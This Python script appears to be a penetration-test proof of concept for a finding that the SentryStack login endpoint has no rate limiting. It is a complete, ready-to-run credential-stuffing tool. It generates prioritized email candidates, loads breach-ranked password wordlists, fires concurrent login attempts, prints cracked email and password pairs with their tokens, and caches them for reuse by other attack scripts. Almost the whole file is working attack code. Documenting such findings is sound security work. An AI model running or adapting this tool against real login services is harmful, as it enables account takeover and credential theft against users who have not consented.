#!/usr/bin/env python3
"""
brute_force_login.py — VULN-03 Part A: No rate-limiting on /login

SentryStack's /api/auth/login endpoint has no rate-limiting, lockout, or
CAPTCHA. This script demonstrates the real-world impact: an attacker can
send an effectively unlimited number of authentication attempts.

WORDLISTS:
This script uses SecLists (https://github.com/danielmiessler/SecLists,
MIT licensed, the industry-standard wordlist collection used throughout
penetration testing) as its primary source:
  - common-usernames.txt  — ~700 real-world common account names
                             (admin, test, demo, user1...userN, etc.)
  - common-passwords.txt  — ~10,000 real-world passwords ranked by
                             actual observed breach frequency

Both files must sit next to this script. If they're missing, the script
falls back to a small built-in list and prints a warning — it still runs,
just with much weaker coverage.

WHAT THIS IS / ISN'T:
This is NOT a full keyspace brute force (trying every possible character
combination) — that is mathematically infeasible regardless of rate
limiting. An 8-char password drawn from upper+lower+digits+special chars
has ~6 quadrillion combinations; bcrypt deliberately makes each guess
slow (~100ms server-side here), capping real-world throughput at roughly
100 guesses/second no matter how the client is written. No amount of
"no rate limiting" changes that math.

What this IS: a realistic, prioritized wordlist/credential-stuffing
attack using the same resources and technique real attackers use. The
vulnerability being proven is that nothing stops it from running to
completion: no 429, no lockout, no CAPTCHA, no increasing delay.

Usage:
    python brute_force_login.py
    python brute_force_login.py --base-url http://localhost:5001
    python brute_force_login.py --max-emails 150 --max-passwords 3000
    python brute_force_login.py --quick          # small run to sanity-check the script

Can also be imported by other attack scripts:
    from brute_force_login import discover_credentials
    creds = await discover_credentials()   # returns cached results if available
"""

import argparse
import asyncio
import itertools
import json
import os
import sys
import time

import aiohttp

DEFAULT_BASE_URL = "http://localhost:5001"
LOGIN_PATH = "/api/auth/login"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CACHE_FILE = os.path.join(SCRIPT_DIR, "discovered_creds.json")
USERNAMES_FILE = os.path.join(SCRIPT_DIR, "common-usernames.txt")
PASSWORDS_FILE = os.path.join(SCRIPT_DIR, "common-passwords.txt")

EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

# ---------------------------------------------------------------------------
# Fallback lists — only used if the SecLists wordlist files aren't present
# ---------------------------------------------------------------------------

FALLBACK_USERNAMES = (
    [f"user{i}" for i in range(1, 21)] +
    ["admin", "administrator", "root", "test", "testuser", "demo",
     "sample", "guest", "owner", "manager", "support"]
)

FALLBACK_PASSWORDS = [
    "123456", "password", "123456789", "12345678", "12345", "qwerty",
    "abc123", "111111", "123123", "admin", "letmein", "welcome",
    "iloveyou", "sunshine", "football", "dragon", "master", "monkey",
    "shadow", "superman", "trustno1",
]

FIRST_NAMES = [
    "james", "mary", "john", "patricia", "robert", "jennifer", "michael", "linda",
    "david", "sarah", "william", "jessica", "richard", "karen", "joseph", "emma",
    "thomas", "lisa", "charles", "nancy", "daniel", "betty", "matthew", "olivia",
    "jake", "amy", "ryan", "chloe", "liam", "sophie", "noah", "grace",
]

LAST_NAMES = [
    "smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis",
    "rodriguez", "martinez", "wilson", "anderson", "taylor", "moore",
    "jackson", "martin", "lee", "perez", "white", "harris", "clark", "patel",
]


def load_lines(path: str) -> list[str]:
    with open(path, encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


# ---------------------------------------------------------------------------
# Candidate generation — tiered by real-world probability
# ---------------------------------------------------------------------------

def generate_email_candidates(max_emails: int) -> list[str]:
    """
    Generates email candidates in priority order (most-likely first):

      Tier A: numeric placeholder accounts (user1..user30) x all domains
              — these are extremely common in dev/test environments and
              match the pattern this exact target is already known to use
      Tier B: full SecLists common-usernames list x all domains
      Tier C: realistic human-name patterns (first.last@domain etc.)
              x all domains, as a lower-priority fallback strategy

    Capped at max_emails, preserving priority order.
    """
    candidates = []
    seen = set()

    def add(email):
        if email not in seen and len(candidates) < max_emails:
            seen.add(email)
            candidates.append(email)

    # Tier A — numeric placeholder accounts, highest real-world probability
    # for a dev/test environment like this one
    for domain in EMAIL_DOMAINS:
        for i in range(1, 31):
            add(f"user{i}@{domain}")
        for name in ["admin", "administrator", "root", "test", "testuser",
                     "demo", "sample", "guest", "owner", "manager", "support"]:
            add(f"{name}@{domain}")

    # Tier B — full SecLists common-usernames wordlist
    if os.path.exists(USERNAMES_FILE):
        usernames = load_lines(USERNAMES_FILE)
    else:
        print(f"[!] {USERNAMES_FILE} not found — using small fallback list "
              f"(get the real one from SecLists for proper coverage)", file=sys.stderr)
        usernames = FALLBACK_USERNAMES

    for domain in EMAIL_DOMAINS:
        for uname in usernames:
            add(f"{uname}@{domain}")
            if len(candidates) >= max_emails:
                break
        if len(candidates) >= max_emails:
            break

    # Tier C — realistic human-name patterns, lowest priority filler
    for first, last in itertools.product(FIRST_NAMES, LAST_NAMES):
        if len(candidates) >= max_emails:
            break
        domain = EMAIL_DOMAINS[hash((first, last)) % len(EMAIL_DOMAINS)]
        add(f"{first}.{last}@{domain}")
        add(f"{first}{last}@{domain}")

    return candidates[:max_emails]


def generate_password_wordlist(max_passwords: int) -> list[str]:
    """
    Loads the SecLists common-passwords list, which is already ordered by
    real-world observed frequency (most common first) — so capping at
    max_passwords naturally keeps the highest-probability guesses.
    Falls back to a small built-in list if the file isn't present.
    """
    if os.path.exists(PASSWORDS_FILE):
        passwords = load_lines(PASSWORDS_FILE)
    else:
        print(f"[!] {PASSWORDS_FILE} not found — using small fallback list "
              f"(get the real one from SecLists for proper coverage)", file=sys.stderr)
        passwords = FALLBACK_PASSWORDS

    return passwords[:max_passwords]


# ---------------------------------------------------------------------------
# Attack logic
# ---------------------------------------------------------------------------

async def try_login(session: aiohttp.ClientSession, sem: asyncio.Semaphore,
                     url: str, email: str, password: str) -> dict | None:
    async with sem:
        try:
            async with session.post(url, json={"email": email, "password": password},
                                     timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    body = await resp.json()
                    token = body.get("accessToken") or body.get("token")
                    return {"email": email, "password": password, "token": token}
        except (aiohttp.ClientError, asyncio.TimeoutError):
            pass
    return None


async def discover_credentials(base_url: str = DEFAULT_BASE_URL,
                                concurrency: int = 20,
                                max_emails: int = 150,
                                max_passwords: int = 3000,
                                use_cache: bool = True,
                                verbose: bool = True) -> list[dict]:
    """Runs the prioritized wordlist attack and returns a list of
    {email, password, token} dicts for every account cracked.
    If a cache file from a previous run exists, returns that instead."""

    if use_cache and os.path.exists(CACHE_FILE):
        with open(CACHE_FILE) as f:
            cached = json.load(f)
        if cached:
            if verbose:
                print(f"[*] Using {len(cached)} cached credential(s) from {CACHE_FILE}")
                print("    (delete this file, or pass --no-cache, to force a fresh run)")
            return cached

    url = base_url.rstrip("/") + LOGIN_PATH
    emails = generate_email_candidates(max_emails)
    passwords = generate_password_wordlist(max_passwords)
    total = len(emails) * len(passwords)

    if verbose:
        print(f"[*] Target: {url}")
        print(f"[*] {len(emails)} email candidates x {len(passwords)} password candidates "
              f"= {total} login attempts")
        print(f"[*] Concurrency: {concurrency} (no rate-limiting on the target — "
              f"this is purely a client-side courtesy cap)")
        print("[*] Starting attack...\n")

    sem = asyncio.Semaphore(concurrency)
    found = []
    attempted = 0
    start = time.time()

    async with aiohttp.ClientSession() as session:
        tasks = [
            try_login(session, sem, url, email, password)
            for email, password in itertools.product(emails, passwords)
        ]

        for coro in asyncio.as_completed(tasks):
            result = await coro
            attempted += 1
            if result:
                found.append(result)
                if verbose:
                    print(f"[+] CRACKED  {result['email']} : {result['password']}")
            if verbose and attempted % 2000 == 0:
                elapsed = time.time() - start
                rate = attempted / elapsed
                print(f"    ... {attempted}/{total} attempts "
                      f"({elapsed:.1f}s elapsed, {rate:.1f} req/s, no throttling observed)")

    elapsed = time.time() - start

    if verbose:
        print(f"\n[*] Finished: {attempted} requests in {elapsed:.1f}s "
              f"({attempted/elapsed:.1f} req/s sustained)")
        print(f"[*] Credentials recovered: {len(found)}")
        for c in found:
            print(f"    - {c['email']} : {c['password']}")
        if not found:
            print("    (no matches in this slice of the wordlist — widen --max-emails / "
                  "--max-passwords for a deeper pass)")

    with open(CACHE_FILE, "w") as f:
        json.dump(found, f, indent=2)
    if verbose:
        print(f"[*] Cached results to {CACHE_FILE} for reuse by other attack scripts")

    return found


def main():
    parser = argparse.ArgumentParser(description=__doc__,
                                      formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    parser.add_argument("--concurrency", type=int, default=20)
    parser.add_argument("--max-emails", type=int, default=150)
    parser.add_argument("--max-passwords", type=int, default=3000)
    parser.add_argument("--quick", action="store_true",
                         help="small run (40 emails x 50 passwords) to sanity-check the script")
    parser.add_argument("--no-cache", action="store_true",
                         help="ignore any existing discovered_creds.json and re-run the attack")
    args = parser.parse_args()

    max_emails = 40 if args.quick else args.max_emails
    max_passwords = 50 if args.quick else args.max_passwords

    try:
        asyncio.run(discover_credentials(
            base_url=args.base_url,
            concurrency=args.concurrency,
            max_emails=max_emails,
            max_passwords=max_passwords,
            use_cache=not args.no_cache,
        ))
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)


if __name__ == "__main__":
    main()